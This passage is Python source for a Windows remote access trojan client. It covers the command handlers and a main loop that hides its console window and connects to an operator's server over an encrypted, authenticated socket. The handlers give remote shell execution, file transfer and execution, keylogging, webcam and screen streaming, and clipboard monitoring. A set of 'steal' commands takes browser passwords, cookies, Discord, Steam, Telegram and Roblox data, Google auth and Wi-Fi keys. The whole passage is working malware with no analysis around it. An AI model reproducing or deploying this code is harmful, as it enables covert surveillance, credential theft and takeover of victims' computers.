    def cmd_get_detailed_sysinfo(self, cmd_id, data):
        try:
            import psutil
            info = {
                'CPU Usage': psutil.cpu_percent(interval=1),
                'CPU Cores': psutil.cpu_count(),
                'RAM Used': f"{psutil.virtual_memory().used / (1024**3):.1f} GB",
                'RAM Total': f"{psutil.virtual_memory().total / (1024**3):.1f} GB",
                'Disk Usage': []
            }
            for part in psutil.disk_partitions():
                try:
                    usage = psutil.disk_usage(part.mountpoint)
                    info['Disk Usage'].append({
                        'device': part.device, 'mountpoint': part.mountpoint,
                        'total': usage.total, 'used': usage.used, 'percent': usage.percent
                    })
                except Exception:
                    pass
            self.send_response('detailed_sysinfo', json.dumps(info).encode(), cmd_id)
        except ImportError:
            self.send_response('error', b'psutil missing', cmd_id)

    def cmd_network_test(self, cmd_id, data):
        tt = data.decode()
        result = {}
        if tt == 'ping':
            try:
                result['ping'] = subprocess.check_output('ping -n 4 8.8.8.8', shell=True).decode()
            except Exception:
                result['ping'] = 'failed'
        elif tt == 'dns':
            try:
                result['dns'] = socket.gethostbyname_ex('google.com')
            except Exception:
                result['dns'] = 'failed'
        self.send_response('network_info', json.dumps(result).encode(), cmd_id)

    # ---------- File operations ----------
    def cmd_list_files(self, cmd_id, data):
        path = data.decode().strip() or 'C:\\'
        try:
            items = []
            with os.scandir(path) as it:
                for entry in it:
                    is_dir = entry.is_dir()
                    size = 0 if is_dir else entry.stat().st_size
                    items.append([entry.name, is_dir, size])
            self.send_response('file_list', json.dumps({'path': path, 'items': items}).encode(), cmd_id)
        except PermissionError:
            self.send_response('error', b'Access denied', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_download_file(self, cmd_id, data):
        fp = data.decode()
        try:
            if not os.path.isfile(fp):
                self.send_response('error', b'Not a file', cmd_id)
                return
            total = os.path.getsize(fp)
            chunks = (total // FILE_CHUNK_SIZE) + (1 if total % FILE_CHUNK_SIZE else 0)
            with open(fp, 'rb') as f:
                idx = 0
                while True:
                    chunk = f.read(FILE_CHUNK_SIZE)
                    if not chunk:
                        break
                    payload = json.dumps({
                        'filename': os.path.basename(fp),
                        'chunk': idx, 'total': chunks,
                        'data': base64.b64encode(chunk).decode()
                    }).encode()
                    self.send_response('file_download_chunk', payload, cmd_id, compress=True)
                    idx += 1
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_upload_file(self, cmd_id, data):
        try:
            obj = json.loads(data.decode())
            fp = obj['filename']
            content = base64.b64decode(obj['content_b64'])
            os.makedirs(os.path.dirname(fp), exist_ok=True)
            with open(fp, 'wb') as f:
                f.write(content)
            self.send_response('error', b'Upload OK', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_execute_file(self, cmd_id, data):
        try:
            os.startfile(data.decode())
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_delete_file(self, cmd_id, data):
        try:
            os.remove(data.decode())
            self.send_response('error', b'Deleted', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_shell_exec(self, cmd_id, data):
        cmd = data.decode()
        try:
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT, text=True)
            out, _ = proc.communicate(timeout=15)
            self.send_response('shell_output', out.encode(), cmd_id)
        except subprocess.TimeoutExpired:
            proc.kill()
            self.send_response('shell_output', b'Timed out', cmd_id)
        except Exception as e:
            self.send_response('shell_output', str(e).encode(), cmd_id)

    def cmd_list_processes(self, cmd_id, data):
        try:
            import psutil
            plist = [(p.pid, p.name()) for p in psutil.process_iter(['pid', 'name'])]
        except ImportError:
            out = subprocess.check_output('tasklist /fo csv /nh', shell=True).decode()
            plist = []
            for line in out.splitlines():
                parts = line.split(',')
                if len(parts) >= 2:
                    plist.append((int(parts[1].strip('"')), parts[0].strip('"')))
        self.send_response('process_list', json.dumps(plist).encode(), cmd_id)

    def cmd_kill_process(self, cmd_id, data):
        pid = struct.unpack('>I', data[:4])[0]
        try:
            import psutil
            psutil.Process(pid).terminate()
        except Exception:
            os.system(f'taskkill /PID {pid} /F')
        self.send_response('error', b'Killed', cmd_id)

    # ---------- Clipboard ----------
    def cmd_get_clipboard(self, cmd_id, data):
        try:
            import pyperclip
            self.send_response('clipboard_data', pyperclip.paste().encode(), cmd_id)
        except Exception:
            self.send_response('error', b'Clipboard failed', cmd_id)

    def cmd_set_clipboard(self, cmd_id, data):
        try:
            import pyperclip
            pyperclip.copy(data.decode())
            self.send_response('error', b'Clipboard set', cmd_id)
        except Exception:
            self.send_response('error', b'Clipboard failed', cmd_id)

    def _clipboard_monitor(self):
        try:
            import pyperclip
            last = ''
            while self.clipboard_monitor_active:
                try:
                    cur = pyperclip.paste()
                    if cur != last:
                        last = cur
                        self.send_response('clipboard_data', cur.encode(), 0)
                except Exception:
                    pass
                time.sleep(1)
        except Exception:
            pass

    # ---------- Power / fun ----------
    def cmd_shutdown(self, cmd_id, data): os.system('shutdown /s /t 0')
    def cmd_restart(self, cmd_id, data):  os.system('shutdown /r /t 0')
    def cmd_logoff(self, cmd_id, data):   os.system('shutdown /l')
    def cmd_lock(self, cmd_id, data):
        try: ctypes.windll.user32.LockWorkStation()
        except Exception: pass

    def cmd_message_box(self, cmd_id, data):
        try: ctypes.windll.user32.MessageBoxW(0, data.decode(), "Message", 0)
        except Exception: pass

    def cmd_open_cd(self, cmd_id, data):
        try: ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        except Exception: pass

    def cmd_flip_screen(self, cmd_id, data):
        try:
            import rotatescreen
            s = rotatescreen.get_primary_display()
            s.set_orientation((s.current_orientation + 180) % 360)
        except Exception: pass

    def cmd_play_sound(self, cmd_id, data):
        try:
            obj = json.loads(data.decode())
            tmp = os.path.join(tempfile.gettempdir(), 'ratsound.wav')
            with open(tmp, 'wb') as f:
                f.write(base64.b64decode(obj['content_b64']))
            import winsound
            winsound.PlaySound(tmp, winsound.SND_FILENAME)
            os.unlink(tmp)
        except Exception: pass

    def cmd_set_wallpaper(self, cmd_id, data):
        try:
            tmp = os.path.join(tempfile.gettempdir(), 'ratwallpaper.jpg')
            urllib.request.urlretrieve(data.decode(), tmp)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, tmp, 3)
        except Exception: pass

    def cmd_set_volume(self, cmd_id, data):
        level = struct.unpack('>I', data[:4])[0]
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            dev = AudioUtilities.GetSpeakers()
            iface = dev.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            vol = cast(iface, POINTER(IAudioEndpointVolume))
            vol.SetMasterVolumeLevelScalar(level / 100.0, None)
        except Exception: pass

    def cmd_mute(self, cmd_id, data):
        try:
            from ctypes import cast, POINTER
            from comtypes import CLSCTX_ALL
            from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
            dev = AudioUtilities.GetSpeakers()
            iface = dev.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            vol = cast(iface, POINTER(IAudioEndpointVolume))
            vol.SetMute(1, None)
        except Exception: pass

    def cmd_move_mouse(self, cmd_id, data):
        try:
            x, y = struct.unpack('>II', data[:8])
            import pyautogui
            pyautogui.moveTo(x, y)
        except Exception: pass

    def cmd_mouse_click(self, cmd_id, data):
        try:
            import pyautogui
            pyautogui.click()
        except Exception: pass

    def cmd_keyboard_type(self, cmd_id, data):
        try:
            import pyautogui
            pyautogui.typewrite(data.decode())
        except Exception: pass

    def cmd_shake_mouse(self, cmd_id, data):
        try:
            import pyautogui
            for _ in range(20):
                pyautogui.moveRel(random.randint(-50, 50), random.randint(-50, 50), duration=0.05)
        except Exception: pass

    def cmd_open_random_site(self, cmd_id, data):
        import webbrowser
        sites = [
            'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
            'https://www.google.com', 'https://www.reddit.com', 'https://www.wikipedia.org'
        ]
        webbrowser.open(random.choice(sites))

    def cmd_beep_sound(self, cmd_id, data):
        try:
            import winsound
            winsound.Beep(1000, 500)
        except Exception: pass

    def cmd_slow_mouse(self, cmd_id, data):
        try:
            import pyautogui
            orig = pyautogui.PAUSE
            pyautogui.PAUSE = 0.5
            time.sleep(5)
            pyautogui.PAUSE = orig
        except Exception: pass

    def cmd_invert_mouse(self, cmd_id, data):
        try:
            ctypes.windll.user32.SwapMouseButton(1)
            time.sleep(5)
            ctypes.windll.user32.SwapMouseButton(0)
        except Exception: pass

    # ---------- STEAL COMMANDS (Python rewrite of the JS steals) ----------
    def cmd_steal_all_credentials(self, cmd_id, data):
        try:
            bundle = collect_all_credentials()
            payload = json.dumps(bundle, default=str).encode()
            self.send_response('steal_all_credentials', payload, cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', f'steal_all: {e}'.encode(), cmd_id)

    def cmd_steal_roblox_cookies(self, cmd_id, data):
        try:
            result = steal_roblox_cookies()
            self.send_response('roblox_cookies', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_roblox_switcher(self, cmd_id, data):
        try:
            result = steal_roblox_switcher()
            self.send_response('roblox_switcher', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_discord_tokens(self, cmd_id, data):
        try:
            result = steal_discord_tokens()
            self.send_response('discord_tokens', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_google_auth(self, cmd_id, data):
        try:
            result = steal_google_auth()
            self.send_response('google_auth', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_browser_passwords(self, cmd_id, data):
        try:
            result = steal_browser_passwords()
            self.send_response('browser_passwords', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_all_cookies(self, cmd_id, data):
        try:
            result = steal_all_cookies()
            self.send_response('all_cookies', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_web_data(self, cmd_id, data):
        try:
            result = steal_web_data()
            self.send_response('web_data', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_steam(self, cmd_id, data):
        try:
            result = steal_steam()
            self.send_response('steam_data', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_telegram(self, cmd_id, data):
        try:
            result = steal_telegram()
            self.send_response('telegram_data', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def cmd_steal_wifi(self, cmd_id, data):
        try:
            result = steal_wifi()
            self.send_response('wifi_passwords', json.dumps(result).encode(), cmd_id, compress=True)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    # ---------- Stress ----------
    def cmd_stress_cpu(self, cmd_id, data):
        secs = struct.unpack('>I', data)[0]
        end = time.time() + secs
        while time.time() < end:
            _ = 1 + 1

    def cmd_stress_ram(self, cmd_id, data):
        mb = struct.unpack('>I', data)[0]
        try:
            block = bytearray(mb * 1024 * 1024)
            time.sleep(10)
            del block
        except MemoryError:
            pass

    def cmd_stress_gpu(self, cmd_id, data):
        secs = struct.unpack('>I', data)[0]
        try:
            import numpy as np
            end = time.time() + secs
            while time.time() < end:
                a = np.random.rand(1000, 1000)
                b = np.random.rand(1000, 1000)
                _ = np.dot(a, b)
        except ImportError:
            self.send_response('error', b'numpy missing', cmd_id)

    # ---------- Location ----------
    def cmd_get_location(self, cmd_id, data):
        lat, lon = get_location()
        self.send_response('location_data', json.dumps({'lat': lat, 'lon': lon}).encode(), cmd_id)

    # ---------- Streaming ----------
    def _webcam_stream(self, cmd_id):
        try:
            import cv2
            cap = cv2.VideoCapture(0)
            if not cap.isOpened():
                self.send_response('error', b'Cannot open webcam', cmd_id)
                return
            while self.webcam_active:
                ret, frame = cap.read()
                if not ret:
                    break
                _, jpeg = cv2.imencode('.jpg', frame)
                self.send_response('webcam_frame', jpeg.tobytes(), cmd_id)
                time.sleep(0.1)
            cap.release()
        except Exception as e:
            self.send_response('error', f'Webcam: {e}'.encode(), cmd_id)

    def _screen_stream(self, interval, cmd_id):
        try:
            import mss
            from PIL import Image
            with mss.mss() as sct:
                while self.screen_active:
                    mon = sct.monitors[1]
                    shot = sct.grab(mon)
                    img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=50)
                    self.send_response('screen_frame', zlib.compress(buf.getvalue()), cmd_id)
                    time.sleep(interval / 1000.0)
        except ImportError:
            self.send_response('error', b'MSS/PIL missing', cmd_id)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def _screenshot_scheduler(self, interval, cmd_id):
        try:
            import mss
            from PIL import Image
            with mss.mss() as sct:
                while self.screenshot_scheduler_active:
                    mon = sct.monitors[1]
                    shot = sct.grab(mon)
                    img = Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
                    buf = io.BytesIO()
                    img.save(buf, format='JPEG', quality=50)
                    self.send_response('screen_frame', zlib.compress(buf.getvalue()), cmd_id)
                    time.sleep(interval)
        except Exception as e:
            self.send_response('error', str(e).encode(), cmd_id)

    def _keylogger_capture(self):
        try:
            from pynput import keyboard
            def on_press(key):
                if not self.keylogger_active:
                    return False
                try:
                    self.keylog_buffer.append(key.char)
                except AttributeError:
                    self.keylog_buffer.append(str(key))
            with keyboard.Listener(on_press=on_press) as listener:
                listener.join()
        except Exception:
            pass

# ============================================================
#  MAIN LOOP
# ============================================================
def main():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass

    send_webhook(get_webhook_info())
    start_crash_recovery()
    threading.Thread(target=play_gta6, daemon=True).start()

    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            if hasattr(socket, 'TCP_KEEPIDLE'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 5)
            if hasattr(socket, 'TCP_KEEPINTVL'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 3)
            if hasattr(socket, 'TCP_KEEPCNT'):
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)

            if USE_SSL:
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=CA_CERT)
                ctx.load_cert_chain(certfile=CLIENT_CERT, keyfile=CLIENT_KEY)
                sock = ctx.wrap_socket(sock, server_hostname=SERVER_IP)

            sock.settimeout(10)
            sock.connect((SERVER_IP, SERVER_PORT))

            token = AUTH_TOKEN.encode()
            sock.sendall(struct.pack('>I', len(token)) + token)
            ack = sock.recv(1)
            if ack != b'\x01':
                sock.close(); time.sleep(5); continue

            chal_len_data = recv_all(sock, INT_LEN)
            if not chal_len_data: sock.close(); continue
            chal_len = struct.unpack('>I', chal_len_data)[0]
            challenge = recv_all(sock, chal_len)
            resp = hmac.new(MASTER_ENC_KEY, challenge, hashlib.sha256).digest()
            sock.sendall(struct.pack('>I', len(resp)) + resp)

            key_len_data = recv_all(sock, INT_LEN)
            key_len = struct.unpack('>I', key_len_data)[0]
            enc_keys = recv_all(sock, key_len)
            dec = decrypt_data_aes256(enc_keys, MASTER_ENC_KEY)
            session_enc = dec[:32]
            session_mac = dec[32:64]

            sock.settimeout(10.0)
            handler = CommandHandler(sock, session_enc, session_mac)

            for item in offline_queue.get_all():
                try:
                    d = base64.b64decode(item['data'])
                    tb = item['type'].encode()
                    pl = struct.pack('>I', len(tb)) + tb
                    pl += struct.pack('>I', item['cmd_id'])
                    pl += struct.pack('>I', len(d)) + d
                    sock.sendall(secure_pack(pl, session_enc, session_mac))
                except Exception:
                    offline_queue.put(item)

            last = time.time()
            while True:
                try:
                    msg = secure_unpack(sock, session_enc, session_mac)
                    if msg is not None:
                        handler.handle_command(msg)
                        last = time.time()
                    else:
                        if time.time() - last > HEARTBEAT_INTERVAL:
                            tb = b'heartbeat'
                            pl = struct.pack('>I', len(tb)) + tb
                            pl += struct.pack('>I', 0) + struct.pack('>I', 0)
                            sock.sendall(secure_pack(pl, session_enc, session_mac))
                            last = time.time()
                except socket.timeout:
                    continue
                except Exception:
                    break
        except Exception:
            pass
        finally:
            if sock:
                try: sock.close()
                except Exception: pass
        time.sleep(5)

if __name__ == '__main__':
    main()